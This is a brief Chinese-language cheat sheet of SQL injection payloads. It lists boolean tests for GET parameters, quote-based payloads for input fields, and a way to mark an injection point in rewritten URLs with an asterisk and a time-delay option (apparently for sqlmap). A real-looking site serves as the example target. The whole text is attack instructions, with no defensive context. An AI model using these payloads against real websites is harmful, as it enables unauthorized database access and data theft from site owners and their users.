GET注入：
url?id=123456 and 1=1 正常
url?id=123456 and 1=2 不正常

输入框：
url?id=123456' and '%'='
url?id=123456' or '%'='

URL重写：
http://www.gantuan.com/review/5573.html
注入方式--http://www.gantuan.com/review/5573*.html，要加--time-sec=6
